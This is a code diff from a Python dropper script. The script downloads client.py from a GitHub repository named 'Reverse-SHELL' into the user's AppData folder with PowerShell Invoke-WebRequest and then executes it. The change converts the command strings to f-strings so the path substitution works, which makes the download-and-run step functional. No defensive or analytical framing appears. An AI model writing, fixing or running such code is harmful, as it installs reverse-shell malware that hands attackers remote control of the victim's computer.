@@ -7,9 +7,9 @@ path = os.environ['appdata'] + '\\client.pyw'
 def setup():
   if not os.path.exists(path):
     subprocess.call(
-      'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile "{path}"',
+      f'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile "{path}"',
       shell=True)
-  subprocess.call('powershell.exe {path}')
+  subprocess.call(f'powershell.exe {path}')
 ################################################ done ##################################################################
 # Running code ...
 if __name__ == '__main__':
